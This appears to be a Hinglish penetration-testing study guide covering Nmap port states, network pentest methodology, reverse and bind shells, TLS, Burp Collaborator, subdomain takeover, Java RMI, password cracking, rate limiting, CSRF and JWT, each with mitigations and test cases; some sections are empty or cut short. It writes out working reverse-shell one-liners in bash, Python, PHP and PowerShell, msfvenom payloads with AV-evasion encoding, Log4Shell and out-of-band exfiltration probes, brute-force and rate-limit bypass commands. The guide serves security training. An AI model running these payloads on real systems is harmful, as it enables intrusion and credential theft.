01Nmap — Open vs Closed vs Filtered Ports

Definition
Open: port accept karta hai (SYN-ACK mila) — service listening hai, exploitable surface. Closed: port reachable hai par koi service nahi (RST reply) — host alive confirm hota hai, OS fingerprinting mein madad karta hai, par direct attack surface nahi. Filtered: firewall/IPS packet drop karta hai (no response ya ICMP unreachable) — nmap ko status pata nahi chalta, --reason se cause dekho.
Impact
Open ports = entry points (RCE, weak creds, known CVEs). Closed vs Filtered distinction batati hai ki firewall hai ya nahi — filtered ports ka matlab host ke aage filtering hai, wahan evasion techniques chahiye (fragmentation, decoys, timing).
Mitigation (5 points)
  • Firewall: sirf required ports allow (default deny inbound).
  • Host hardening: unnecessary services band karo.
  • IDS/IPS: scan detection (port scan signatures) + alerting.
  • Rate-limit connection attempts (fail2ban style) for exposed services.
  • Network segmentation: internal ports public exposure mein nahi.
Test Cases (Hinglish)
  • nmap -sS -p- -T4 target — full SYN scan; open ports note karo.
  • Closed port verify: nmap -sS -p 9999 target — RST response aata hai? (host alive).
  • Filtered check: nmap -sA target — ACK scan se filtered ports alag dikhte hain.
  • nmap --reason -p 22,80 target — har port ka exact reason (syn-ack / rst / no-response).
  • Evasion: -f (fragmented), -D RND:5 (decoys), -T1 (slow) — firewall bypass attempt.
  • nmap -O target — closed port responses se OS fingerprint.
Real-world Scenario
External scan mein 445 filtered tha, 22 open — filtered port ne bataya ki host firewall ke peeche hai. Open SSH par weak creds mile → bastion compromised → internal pivot. Lesson: open ports hi real attack surface hain.

Definition

Impact

Mitigation (5 points)

  • Patch critical CVEs (MS17-010, BlueKeep) immediately.
  • Strong auth: disable anonymous, MFA on remote access.
  • Network ACLs: DB/admin ports internal-only + VPN.
  • Monitor: auth failures, unauth service access logs.
Test Cases (Hinglish)
  • Har open port par -sV --version-light — service + version, phir searchsploit se CVE check.
  • FTP: ftp target → anonymous/anonymous login try karo.
  • SMB: enum4linux -a target (null session), nmap --script smb-vuln-ms17-010.
  • Redis: redis-cli -h target info — bina password connect hota hai? SSH key write test.
  • MSSQL: hydra -l sa -P rockyou.txt target mssql; login ke baad xp_cmdshell.
  • RDP: nmap --script rdp-vuln-ms12-020; cred spray with crowbar.
  • Elasticsearch: curl http://target:9200/_cat/indices — data accessible?
Real-world Scenario
E-commerce company ka MongoDB 27017 public par tha bina auth — shodan se mila → 2 crore customer records dump. Fix: port close + auth + network ACL.

03Network Pentest — Approach & Methodology

Definition
Structured flow: 1. Scope & ROE (IP ranges, exclusions, timing) → 2. Discovery (ping sweep, DNS, ARP) → 3. Port scan (top 1000 → full -p-) → 4. Service fingerprinting (-sV, banners) → 5. Vulnerability mapping (nmap vulners, searchsploit, CVE DB) → 6. Exploitation (manual + Metasploit) → 7. Post-exploitation (priv esc, lateral movement, persistence) → 8. Reporting (evidence, CVSS, remediation). Internal vs external testing alag strategy: external = perimeter/firewall; internal = segmentation, ARP/DHCP attacks, relay.
Impact
Methodology follow karne se no missed services, reproducible findings, aur professional reporting. Ad-hoc testing = false negatives + dangerous impact.
Mitigation (5 points)
  • Phase-wise testing with written scope (avoid legal/ops issues).
  • Least-intrusive first: passive → active; avoid DoS without approval.
  • Timebox scans; coordinate with client ops team (prod systems).
  • Keep evidence: raw scan outputs, screenshots, timestamps.
  • Report: executive summary + technical detail + fix guidance.
Test Cases (Hinglish)
  • Discovery: nmap -sn 10.10.0.0/24 — live hosts.
  • Full scan: nmap -sS -p- -T4 -oA full target.
  • Services: nmap -sV -sC -oA svc target — version + default scripts.
  • Vuln mapping: nmap --script vulners / searchsploit openssh 7.2.
  • Exploit: Metasploit use exploit/... ya manual PoC (authorized).
  • Priv esc: sudo -l, uname -a, kernel exploits, SUID files.
  • Lateral: stolen creds se crackmapexec smb 10.10.0.0/24 -u user -p pass.
Real-world Scenario
Internal test: 192.168.x.x par port scan → 445 open → null session se user enum → weak password spray → domain admin. Full chain external-to-internal documented with screenshots for report.

04OSI Model — 7 Layers Explained

Definition
L1 Physical: bits, cables, hubs — attacks: cable tap, jamming. L2 Data Link: frames, MAC, switches — attacks: ARP spoofing, MAC flooding, VLAN hopping (DTP abuse). L3 Network: packets, IP, routers — attacks: IP spoofing, ICMP redirect, Smurf DDoS. L4 Transport: TCP/UDP, ports — attacks: SYN flood, port scanning, session hijacking. L5 Session: session establishment/management — attacks: session hijacking/fixation (NetBIOS, RPC). L6 Presentation: encoding, encryption (SSL/TLS) — attacks: SSL stripping, downgrade attacks. L7 Application: HTTP, DNS, SMTP, FTP — attacks: SQLi, XSS, XXE, SSRF, command injection.
Impact
Har layer ke apne attacks aur controls hain — layered security (defense in depth) har layer par controls maangti hai. L2 attacks (ARP spoof) = MITM without any app vulnerability.
Mitigation (5 points)
  • L1-L2: port security, 802.1X, dynamic ARP inspection, DHCP snooping.
  • L3: IPsec, ingress/egress filtering (BCP38 anti-spoof).
  • L4: firewalls, rate limiting, SYN cookies (tcp_syncookies).
  • L5-L6: TLS everywhere, secure session IDs, HSTS.
  • L7: WAF, input validation, patching, app-level authN/authZ.
Test Cases (Hinglish)
  • L2: bettercap se ARP spoof karke traffic sniff karo (authorized lab).
  • L2: MAC flooding (macof) — switch fails open? VLAN hopping (yersinia DTP).
  • L3: spoofed source IP packets — router filter karta hai? (BCP38 test).
  • L4: hping3 -S -p 80 --flood — SYN flood se service down? (authorized DoS test).
  • L6: SSL strip test — HSTS missing par HTTP redirect? (bettercap/responder).
  • L7: web app OWASP checklist (Part 1 topics).
Real-world Scenario
ARP spoof se office LAN par employee ka HTTPS traffic MITM hua (before HSTS) → login creds capture. Fix: 802.1X + HSTS + TLS everywhere.

05Bind vs Reverse Shell — Differences

Definition
Bind shell: victim par listener chalta hai (port kholta hai), attacker usse connect karta hai — nc -lvnp 4444 -e /bin/bash (victim) → nc 10.10.10.5 4444 (attacker). Reverse shell: victim attacker ke listener par outbound connect karta hai — nc -lvnp 4444 (attacker) → victim chalata hai bash -i >& /dev/tcp/10.10.10.1/4444 0>&1. Difference: direction of connection; bind = inbound (firewall ingress blocks), reverse = outbound (egress usually open — isliye pentests mein reverse preferred). Bind ko target IP pata hona chahiye; reverse mein attacker IP chahiye.
Impact
Dono = remote code execution access. Bind fail hota hai inbound-filtered networks par; reverse fail hota hai outbound-filtered (strict egress) networks par — dono techniques aani chahiye.
Mitigation (5 points)
  • Egress filtering: allow only required outbound ports (reverse shells block).
  • Ingress firewall: no random inbound ports (bind shells block).
  • Host IPS/EDR: detect nc/powershell outbound anomalies, shell parent-child chains.
  • Application allowlisting (bash/python in web context?).
  • Monitor outbound connections to unknown IPs (SIEM alerts).
Test Cases (Hinglish)
  • Bind: victim nc -lvnp 4444 -e /bin/bash; attacker nc target 4444.
  • Reverse: attacker nc -lvnp 4444; victim payload (next topic) bhejo.
  • Firewall test: inbound 4444 blocked? reverse try karo — kaunsa kaam karta hai.
  • Egress test: outbound 4444 blocked? bind try karo.
  • Detection test: EDR reverse shell flag karta hai? (authorized lab).
Real-world Scenario
DMZ web server par RCE mila — inbound ports blocked, isliye bind shell fail hua; reverse shell to attacker's VPS (port 443) se firewall bypass hua kyunki outbound HTTPS allowed tha.

06Shell Payloads — Reverse & Bind (Multi-Language)

Definition
Common one-liners: Bash reverse: bash -i >& /dev/tcp/10.10.10.1/4444 0>&1; Netcat: nc -e /bin/sh 10.10.10.1 4444; Python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'; PHP: php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; PowerShell (Windows): powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(($r+$p),0,(($r+$p).Length))}"; msfvenom: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf, -p windows/x64/meterpreter/reverse_tcp, -p php/meterpreter_reverse_tcp, -p android/meterpreter/reverse_tcp. Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")' + socat.
Impact
Working payload = shell access = system compromise. Payload generation + staging is core to exploitation phase.
Mitigation (5 points)
  • Egress allowlist — reverse shells ka main defence.
  • EDR: shell parent-child detection, powershell logging (ScriptBlock), AMSI.
  • Application control: block bash/python/powershell in web contexts.
  • Least privilege service accounts (shell bhi low-priv mile).
  • Network anomaly detection: new outbound connections to unusual IPs.
Test Cases (Hinglish)
  • msfvenom list: msfvenom -l payloads | grep shell.
  • Linux: bash/nc/python reverse payloads test karo (lab VM).
  • Windows: PowerShell payload + nc -lvnp 4444 listener.
  • Encoding/evasion: msfvenom -e x86/shikata_ga_nai -i 5 — AV detect hota hai?
  • Bind variant: msfvenom -p linux/x64/shell_bind_tcp LPORT=4444.
  • Stabilize: python pty spawn + socat file:`tty`,raw,echo=0 tcp:....
Real-world Scenario
File upload RCE mila — PHP reverse shell uploaded, attacker listener par shell mila, python se TTY stabilize karke interactive access → lateral movement chain start.

07Wireshark vs Burp — Why Is the Request Encrypted in Wireshark?

Definition
Burp Suite ek MITM proxy hai — browser Burp par HTTP bhejta hai, Burp TLS terminate karke request plaintext mein dikhata hai (browser Burp ke CA par trust karta hai), phir Burp server se naya TLS connection banata hai. Isliye Burp mein request readable hai. Wireshark wire par raw packets dekhta hai — client aur server ke beech ka actual TLS ciphertext; bina private key / session keys ke payload readable nahi hota. Encryption client↔server ke beech hai, Burp ke beech nahi.
Impact
Yeh difference samajhna zaroori hai: Wireshark mein "encrypted" dekh kar confusion nahi honi chahiye — TLS working hai. Burp ka CA install na hone par app/TLS fail hota hai (pinning scenario).
Mitigation (5 points)
  • TLS everywhere: HTTPS + HSTS (Wireshark capture mein data safe).
  • Certificate validation: users/apps CA spoofing se bachein (pinning).
  • Never fall back to HTTP; disable legacy protocols.
  • Encrypt sensitive fields end-to-end (beyond TLS) for high-risk apps.
  • Monitoring: TLS inspection at perimeter (corporate proxy) only with policy.
Test Cases (Hinglish)
  • Wireshark capture karo HTTPS traffic — payload bytes encrypted dikhte hain?
  • Decrypt: browser SSLKEYLOGFILE env var set karo, Wireshark → TLS → (Pre)-Master-Secret log — ab plaintext dikhta hai.
  • Burp: browser proxy set karo + CA install — request plaintext dikhti hai (compare Wireshark se).
  • RSA key import (non-PFS cipher) se decrypt demo karo.
  • Verify: Wireshark mein TLS version + cipher suite (ClientHello) inspect karo.
Real-world Scenario
Interview/technical scenario: Wireshark mein login POST encrypted dikha — galat conclusion "app secure hai". Asli check: Burp se plaintext request mein credentials + tokens the, aur server ne 301 redirect ke baad bhi HTTP allow kiya — MITM risk real tha.

08SSL/TLS Handshake — How Encryption Works

Definition
TLS 1.2 handshake: ClientHello (TLS version, cipher suites, random) → ServerHello (chosen cipher, random, session ID) → Certificate (server public key + signature) → Key Exchange (ECDHE — ephemeral keys) → Finished (both sides verify) → ab symmetric encryption (AES-GCM) se application data flow. TLS 1.3: 1-RTT, fewer round trips, only AEAD ciphers, forward secrecy default (ECDHE mandatory). Kyun dono? Asymmetric (RSA/ECDHE) slow — sirf identity + key exchange ke liye; symmetric (AES/ChaCha20) fast — bulk data ke liye.
Impact
Handshake flaws = downgrade attacks (POODLE, BEAST, SSL striping), key theft (Heartbleed), weak ciphers (RC4/DES). Certificate validation failure = MITM.
Mitigation (5 points)
  • Use TLS 1.2+ (disable 1.0/1.1, SSLv3).
  • Configure strong ciphers: ECDHE + AES-GCM/ChaCha20 (forward secrecy).
  • Valid certificates + HSTS + OCSP stapling.
  • Patch TLS libraries (OpenSSL Heartbleed class bugs).
  • Regular TLS audits (testssl.sh / Qualys SSL Labs).
Test Cases (Hinglish)
  • openssl s_client -connect target:443 -tls1_2 — cipher + cert details dekho.
  • testssl.sh target — cipher strength, protocols, vulnerabilities scan.
  • Downgrade test: openssl s_client -tls1 — TLS 1.0 accept hota hai?
  • Weak cipher test: RC4/3DES supported hai? (Qualys SSL Labs grade check).
  • Cert chain: openssl s_client -showcerts — chain valid + trusted?
  • Heartbleed: nmap --script ssl-heartbleed target.
Real-world Scenario
Legacy server TLS 1.0 + RC4 support karta tha — BEAST/POODLE class attacks se session decrypt possible. Qualys grade F mila → patch karke TLS 1.2+ only kiya.

09Expired SSL Certificate — Risk (Tunnel Is Still Encrypted!)

Definition
Expired certificate ka matlab encryption band nahi hai — TLS tunnel ab bhi encrypted hai. Problem hai identity/trust: browser certificate validity verify nahi kar sakta, isliye warning dikhata hai. User warning bypass karta hai → attacker apna (attacker-controlled) certificate usi site par daal sakta hai → MITM possible. Extra: service outages (APIs strict validation karte hain), compliance violations (PCI-DSS requires valid certs), trust erosion.
Impact
MITM/phishing (users click through warnings), API failures, PCI/compliance findings, automated scanners flag it (Medium).
Mitigation (5 points)
  • Automate renewal: ACME/Let's Encrypt, cert manager.
  • Certificate expiry monitoring/alerting (90/30/7 days).
  • Central certificate inventory + ownership per team.
  • Short-lived certs (90 days) reduce expiry risk.
  • Internal CAs: auto-renewal + audit reports.
Test Cases (Hinglish)
  • Check expiry: echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -dates.
  • Browser kholo — certificate warning aati hai? (expired/self-signed?)
  • API client strict validation karta hai? (curl -k vs without — failure test).
  • HSTS active hai? — warning bypass ke baad bhi HTTPS force?
  • Nessus/Qualys scan mein "SSL Certificate Expired" finding check karo.
Real-world Scenario
Banking portal ka cert 3 din expire hua — users "proceed anyway" kar rahe the; attacker ne same hostname par rogue cert use karke login phish kiya. Fix: ACME auto-renewal + monitoring.

10Burp Collaborator — Use Cases

Definition
Burp Collaborator ek OOB (out-of-band) interaction server hai — Burp tumhe ek unique subdomain deta hai (xyz.oastify.com); target server jab us domain par DNS/HTTP/SMTP request karta hai to Burp par interaction record hota hai. Use cases: blind SSRF detection, blind XXE, blind/time-independent SQLi (OOB via xp_dirtree/LOAD_FILE), Log4Shell (${jndi:ldap://collab}), header injection callbacks, email/HTML rendering callbacks, template injection probes, host header attacks.
Impact
OOB techniques se aisi blind vulnerabilities confirm hoti hain jo response mein kabhi signal nahi detin — SSRF/XXE/SQLi jo normal testing mein miss ho jaati hain.
Mitigation (5 points)
  • Egress filtering — OOB exfiltration ka main defence.
  • Disable external entities (XXE), validate URLs (SSRF).
  • Parameterized queries (SQLi root fix) — OOB bhi band.
  • Log4j/3rd-party: patch + -Dlog4j2.formatMsgNoLookups=true class controls.
  • Monitor outbound DNS/HTTP from servers (SIEM alerts).
Test Cases (Hinglish)
  • Collaborator client kholo → subdomain copy karo.
  • Blind SSRF: url=http://collab.oastify.com — DNS interaction aata hai?
  • Blind XXE: external DTD with parameter entity → data collab par exfil.
  • OOB SQLi (MSSQL): '; EXEC xp_dirtree '\\collab\a'-- — DNS hit?
  • Log4Shell: ${jndi:ldap://collab/a} header/param mein — interaction?
  • HTML injection: email template mein <img src="http://collab/x"> — open hua?
Real-world Scenario
Blind SSRF in image URL fetch — response kabhi internal data nahi dikhata tha; Collaborator DNS interaction se confirm hua → metadata endpoint fetch karke IAM keys nikaale.

11DNS Misconfigurations & Subdomain Takeover

Definition
DNS misconfigs: open zone transfer (AXFR bina auth — full DNS map leak), dangling CNAME (subdomain kisi deprovisioned service par point karta hai — Heroku/S3/GitHub Pages/Azure), missing SPF/DMARC (email spoofing), wildcard DNS, NS delegation to dead provider (full domain takeover), no DNSSEC (cache poisoning risk). Subdomain takeover: dangling CNAME mila → service provider par same name register karo → ab tum control karte ho victim domain ka content — cookies scope, phishing, XSS on main domain (if cookies domain-wide), SEO abuse.
Impact
Takeover = full content control on trusted subdomain (phishing credibility), session/cookie theft, malware hosting, brand damage. Zone transfer = complete network map for attackers.
Mitigation (5 points)
  • Restrict AXFR to authorized secondaries only.
  • Remove/point dangling CNAMEs; automate subdomain ownership checks.
  • Deploy SPF/DKIM/DMARC (reject policy).
  • DNSSEC signing for integrity.
  • Regular audits: DNS records + takeover scan (nuclei -t takeovers).
Test Cases (Hinglish)
  • Zone transfer: dig AXFR target.com @ns1.target.com — records milte hain?
  • Enumeration: subfinder -d target.com + amass enum -d target.com.
  • Takeover check: dig CNAME sub.target.com — CNAME unclaimed service par? phir nuclei -t http/takeovers/.
  • SPF/DMARC: dig TXT target.com — spf/dkim/dmarc records hain?
  • DNS rebinding/wildcard: random subdomain resolve hota hai?
  • NS check: dig NS target.com — dead provider? (can-i-take-over-xyz checklist).
Real-world Scenario
staging.target.com ka CNAME deprovisioned Heroku app par tha — attacker ne Heroku par same name app banaya → staging login page par fake cred form → employee credentials phish. Fix: CNAME cleanup + takeover monitoring.

12RMI Injection (Java Remote Method Invocation)

Definition
Java RMI = remote method calls between JVMs — registry default port 1099 (plus random ports), also RMI-IIOP, JMX-RMI. Attacks: registry bina auth serialized objects accept karta hai → deserialization RCE (ysoserial gadget chains — CommonsCollections etc.); unauthenticated JMX → MBean invoke → code exec (javax.management.loading.MLet remote class loading); security manager misconfig; codebase URL spoofing.
Impact
Remote code execution on Java services (often internal middleware) — CVSS 9.8 class. RMI registry exposed = immediate critical.
Mitigation (5 points)
  • Firewall RMI/JMX ports (internal only).
  • Authentication on registry/JMX (JAAS, SSL).
  • Disable remote class loading / restrict codebase.
  • Deserialization filters (JEP 290 / ObjectInputFilter allowlists).
  • Patch JDK (many RMI CVEs); run RMI apps in sandbox/least privilege.
Test Cases (Hinglish)
  • Scan: nmap -p 1099 target + nmap --script rmi-* target.
  • Enum: Metasploit auxiliary/scanner/misc/java_rmi_server / rmi_dumpregistry.
  • BaRMIe tool: registry endpoints + attack surface detect.
  • ysoserial: java -jar ysoserial.jar CommonsCollections6 'id' → registry ko bhejo (authorized).
  • JMX check: port 1099/9012/8686 par JMX unauth MBean access (mlet RCE).
  • SSL variant: RMI over SSL ke saath bhi test karo (port 1100+).
Real-world Scenario
Internal scan mein Java app ka RMI registry 1099 open — BaRMIe se confirmed deserialization surface → ysoserial CommonsCollections chain se system shell. Fix: firewall + auth + JEP 290 filter.

13Honeypot — What It Is & How It Works

Definition
Honeypot = decoy system/service jo attacker ko attract karne ke liye deliberately vulnerable dikhta hai — asli maqsad detection, attacker TTPs ka intel, diversion. Types: low-interaction (emulated services — Cowrie SSH/Telnet, Dionaea, Glastopf) — safe, limited; high-interaction (real vulnerable systems) — realistic, risky; honeynets (network of honeypots); honeytokens (fake credentials/files/DB rows jo touch hote hi alert dete hain). Security teams isse early warning system ki tarah use karte hain.
Impact
Attacker honeypot mein time waste karta hai, uski tools/techniques log hoti hain, breach early detect hota hai. Galt deployment se attacker ko asli systems ka rasta mil sakta hai — segmentation zaroori.
Mitigation (5 points)
  • Honeypots ko production network se isolate karo (VLAN).
  • Log everything: sessions, commands, keystrokes, files.
  • Integrate with SIEM — instant alerting on interaction.
  • Regularly update emulation (attackers fingerprint honeypots).
  • Never put real data/creds in honeypots.
Test Cases (Hinglish)
  • Deploy: docker run cowrie — SSH honeypot; connect karke commands log dekho.
  • Honeytoken: fake API key/DB record rakh kar interaction alert test karo.
  • Fingerprint: nmap se honeypot detect hota hai? (imperfect emulation).
  • SIEM integration: honeypot hit par alert aata hai?
  • Isolation test: honeypot se production network reachable nahi hai?
Real-world Scenario
Enterprise ne perimeter par Cowrie honeypot deploy kiya — attacker ne usi par brute force ki, uske wordlists aur tools capture hue → IOC banakar puri network par hunting hui, breach hone se pehle hi.

14Social Engineering Attacks — Phishing, Spear Phishing, Baiting, Tailgating

Definition
Phishing: mass generic emails (fake login, invoice) — volume game. Spear phishing: targeted, researched victim (LinkedIn/job info) — high success. Whaling: executives/CEOs. Vishing: phone calls; Smishing: SMS. Baiting: infected USB drives chhodna, fake ads/downloads. Tailgating: authorized person ke saath physical access. Pretexting: fake scenario (IT support call) se info nikalna. Human = weakest link — technical controls bypass ho jaate hain.
Impact
Credential theft, malware delivery (ransomware entry), BEC (business email compromise) fraud, physical breach — most breaches social engineering se shuru hote hain.
Mitigation (5 points)
  • Security awareness training + regular phishing simulations (GoPhish).
  • MFA everywhere (stolen password alone useless).
  • Email security: DMARC/DKIM/SPF + gateway filtering + link sandboxing.
  • Physical: badge + tailgating policy, reception awareness, clean desk.
  • Incident reporting culture + rapid response for reported phishing.

24Four Types of Intruder Attacks

Definition
1. Sniper: ek payload position, ek payload set — har position ek-ek karke fuzz hoti hai (e.g., har parameter alag test). 2. Battering Ram: ek payload set, saare positions mein same value ek saath (e.g., same username+password). 3. Pitchfork: multiple payload sets, parallel — position1=set1[i], position2=set2[i] (paired combos: user[i]/pass[i]). 4. Cluster Bomb: multiple payload sets, cartesian product — saare combinations (user1×pass1, user1×pass2...).
Impact
Sahi attack type = efficient + correct results. Galat type = useless requests ya huge load (Cluster Bomb on 2 big wordlists = lakhs requests).
Mitigation (5 points)
  • Match attack type to test goal (enum vs pair vs combo).
  • Cluster Bomb careful — combinations explode (n×m).
  • Use throttling + resource pools (intruder settings).
  • Verify findings — Intruder sirf discovery ke liye.
  • Scope + rate limits respect karo.
Test Cases (Hinglish)
  • Sniper: username=§FUZZ§&password=test — username enumeration (single position).

25Rate Limiting — How Would You Implement It?

Definition
Rate limiting = request frequency control to prevent abuse (brute force, scraping, DoS). Layers: CDN/edge (Cloudflare), reverse proxy (Nginx limit_req), API gateway (Kong/Envoy), app middleware, Redis-based. Algorithms: fixed window (simple, burst edges), sliding window (smooth), token bucket (burst allowed, avg capped), leaky bucket (constant rate). Key by: IP + user ID + endpoint combination; trust X-Forwarded-For only from trusted proxies (spoof risk). Policies: login 5-10/min, API per-key limits, exponential backoff, CAPTCHA after N failures, lockout with recovery, connection limits for slowloris.
Impact
No rate limit = brute force, credential stuffing, scraping, API abuse, DoS. Poor implementation (IP-only) = NAT users locked out, attackers spoof XFF.
Mitigation (5 points)
  • Multi-dimensional limits: per-user + per-IP + per-endpoint.
  • Distributed store (Redis sliding window) — scale + consistency.
  • Graceful response: 429 + Retry-After, not silent drop.
  • Exempt legit integrations via API keys with own quotas.
  • Monitor limit hits — anomaly alerts (abuse detection).
Test Cases (Hinglish)
  • Login brute: Intruder 100 attempts — kahan 429/lockout aata hai?
  • Bypass: X-Forwarded-For spoof (X-Forwarded-For: 1.2.3.4 change karke) — limit reset hota hai?
  • Bypass: session rotate karke attempts — user-based limit missing?
  • Distributed sim: multiple IPs se — per-IP vs per-user check.
  • Nginx test: limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m — burst behavior.
  • 429 response: Retry-After header present? proper UX?
Real-world Scenario
OTP endpoint ka sirf per-IP limit tha — attacker ne XFF rotate karke 10k OTP attempts kiye → 2FA bypass. Fix: per-user+per-IP+Redis sliding window + CAPTCHA escalation.

37Why MD5 Is Weak

Definition
MD5 (128-bit) weaknesses: collision attacks (two different inputs, same hash — practical since 2004/2007, cheap GPU clusters; chosen-prefix collisions: hashclash/fastcoll), preimage resistance weak (theoretical 2^123, but collision enough for certs/files), extremely fast (hashcat ~10+ GH/s — password cracking trivial), no salt support by design, length extension (HMAC misuse). SHA-1 bhi deprecated (SHAttered 2017). Use: SHA-256/384 (integrity), bcrypt/Argon2/scrypt (passwords), HMAC-SHA256 (authenticity).
Impact
MD5 password hashes = instant crack; MD5 file signatures = forged files pass verification; MD5 certs (CVE-2008-5078 class) = CA forgery.
Mitigation (5 points)
  • Passwords: Argon2id/bcrypt (cost factor tuned) with per-user salt.
  • Integrity: SHA-256/384 + signature (RSA/Ed25519).
  • HMAC: HMAC-SHA256 with secret — never MD5.
  • Migration: rehash passwords on next login (upgrade path).
  • Scan: detect MD5 usage (SAST + code review) and replace.
Test Cases (Hinglish)
  • Hash identify: hashid '5f4dcc3b5aa765d61d8327deb882cf99' → MD5.
  • Crack: hashcat -m 0 hash.txt rockyou.txt — seconds mein crack hote hain?
  • Collision demo: fastcoll se two files same MD5 (lab).
  • Length extension: hash_extender se MD5-HMAC forge (lab).
  • DB audit: password column hash format check karo — MD5/unsalted?
Real-world Scenario
DB breach mein 1M MD5 hashes — hashcat se 78% crack hue (rockyou) kyunki fast + unsalted. Fix: Argon2id migration + breach notification.

38Password Cracking — hashcat & John the Ripper

Definition
hashcat (GPU): modes — -m 0 MD5, -m 1000 NTLM, -m 3200 bcrypt, -m 13100 Argon2, -m 22000 WPA-PBKDF2; attacks — dictionary (-a 0), combinator (-a 1), mask (-a 3), hybrid (-a 6/7), rules (-r). john (CPU, versatile): john --wordlist=rockyou.txt hash.txt, --format=, incremental, rules (dive, best64), zip/ssh/keepass formats. Workflow: hash extract (dump/responder) → format identify (hashid) → wordlist+rule (rockyou, cewl target-specific) → mask for structure (password?d) → analyze cracked passwords for reuse patterns.
Impact
Weak hashes + weak passwords = credential compromise; cracked passwords often reused across systems (pivot).
Mitigation (5 points)
  • Argon2id/bcrypt with cost — cracking slow (hashcat 10k/s not 10G/s).
  • Enforce length over complexity (NIST: 8+ chars, passphrases), breached-password check.
  • MFA — cracked password useless alone.
  • Never reuse passwords; enterprise: SSO + password manager policy.
  • Monitor dark web/breach feeds for corporate creds.
Test Cases (Hinglish)
  • Identify: hashid '$2y$10$...' → bcrypt (m 3200).
  • Crack: hashcat -m 3200 hash.txt rockyou.txt -r rules/best64.rule.
  • Mask: hashcat -m 1000 -a 3 ntlm.txt '?u?l?l?l?d?d' — structure guess.
  • John zip: zip2john file.zip > h.txt; john h.txt.
  • cewl: cewl https://company.com -w words.txt — target-specific wordlist.
  • Compare: same hash in MD5 vs bcrypt — time difference demo.
Real-world Scenario
NTLM hashes from internal test — hashcat rockyou+rule se admin crack hua; same password domain-wide reuse mila → domain admin. Fix: password policy + MFA + hashcat-resistant hashing.

39CSRF Token — Where to Pass in Request

Definition
Anti-CSRF token pass karne ke standard places: 1. Hidden form field (<input type="hidden" name="csrf_token">) — synchronizer token pattern; 2. Custom header (X-CSRF-Token) — AJAX/SPA/JSON APIs (attacker's cross-site JS can't set custom headers without CORS preflight approval); 3. Both — defense in depth. Rules: token server-side session se bound (not just static cookie), random 128-bit, per-session/per-request, validate on every state-changing method (POST/PUT/DELETE/PATCH), never GET. Double-submit cookie pattern: same token in cookie + header, server compares.
Impact
Galt jagah/validation = CSRF possible. Token in URL (GET) = referer leak. Token validation sirf form par = API endpoints unprotected.
Mitigation (5 points)
  • Hidden field + server-side session binding (synchronizer pattern).
  • Custom header (X-CSRF-Token) for APIs/SPA — CORS preflight blocks attackers.
  • Validate method: no state changes via GET.
  • SameSite=Lax/Strict cookie as second layer.
  • Rotate token on login; bind to session, not global static value.
Test Cases (Hinglish)
  • Form mein token missing? — CSRF PoC form se test (Part 1 topic 31).
  • Token static? — logout/login par change hota hai?
  • Token validation: galat/empty token bhejo — server reject karta hai?
  • API endpoint: header token required hai ya form token bhi kaam karta hai?
  • Referer check: token URL mein hai? (leak risk).
  • SameSite bypass: subdomain par cookie injectable? token bhi check hota hai?
Real-world Scenario
JSON API ne sirf form-token validate kiya, header variant nahi — attacker ne same-origin form POST se token reuse karke CSRF kiya. Fix: per-request header token + session binding.

Definition
API Gateway = microservices ke saamne single entry (Kong, AWS API Gateway, Nginx, Envoy, KrakenD). Security features: authentication (API keys, OAuth/JWT), authorization policies, rate limiting (per key/user), request validation (schema, size, content-type), TLS termination + pinning, IP allow/deny lists, logging/monitoring, request transformation (header stripping — remove internal headers), WAF integration, circuit breaking, CORS policy centralization. Considerations: gateway bypass (direct service access), misconfig (wildcard routes, open CORS, no auth on some routes), secret sprawl (keys in gateway config), logging sensitive data, DoS on gateway, versioning/path confusion.
Impact
Gateway secure = services protected centrally; gateway misconfig = single point of mass compromise (auth bypass on all APIs).
Mitigation (5 points)
  • Defense in depth: gateway auth + service-level auth (both).
  • Least privilege routes: explicit route allowlist, deny unknown.
  • Centralized rate limit + quotas + anomaly alerts.
  • No secrets in gateway configs (Vault/KMS); rotate keys.
  • Audit: gateway logs + config reviews + penetration testing.
Test Cases (Hinglish)
  • Bypass: service direct IP/port se accessible? (gateway sirf entry hai?).
  • Route wildcard: /api/* bina auth route exist karta hai?
  • Path confusion: /admin vs //admin, /api/../admin — gateway routing differ?
  • CORS central policy: origin allowlist strict hai? credentials allowed?
  • Rate limit: key rotate karke limit bypass hota hai? XFF spoof?
  • Header leakage: internal headers (X-Internal, X-Forwarded) client ko expose hote hain?
Real-world Scenario
Kong gateway par ek route /internal/* bina auth tha — attacker ne usse admin-service calls kiye. Fix: route allowlist + service-level auth + audit.

48JWT vs Normal Session Tokens — Why JWT Is Recommended

Definition
Session tokens (opaque): random string, server-side store (Redis/DB), lookup per request — easy revocation, stateful. JWT: self-contained signed claims (header.payload.signature), stateless — no server lookup; carries user info/roles/scopes directly. Why JWT recommended: 1. Stateless/scalable — no session store, horizontal scaling easy (microservices share verification via JWKS); 2. Cross-domain — OAuth/OIDC, SSO, mobile + web + third-party; 3. Self-contained — claims available without DB round-trip (perf); 4. Signed — tamper-proof (if verified properly); 5. Standard — ecosystem (libraries, JWKS). Costs: revocation hard (stateless) — solve via short expiry + refresh tokens + denylist; bigger token size.
Impact
Sahi use = scalable secure auth; galat use (alg:none, weak secret, no exp) = auth bypass (Part 1 topic 33).
Mitigation (5 points)
  • RS256/ES256 + strict alg allowlist + full validation (exp/iss/aud).
  • Short-lived access tokens (5-15 min) + rotating refresh tokens.
  • Server-side denylist/revocation for high-risk events.
  • Never store JWT in localStorage — HttpOnly cookie/memory.
  • Rotation + key management (JWKS, kid allowlist).
Test Cases (Hinglish)
  • Compare: JWT stateless check — logout ke baad bhi token valid? (revocation test).
  • alg:none / weak secret / exp tamper — Part 1 topic 33 cases.
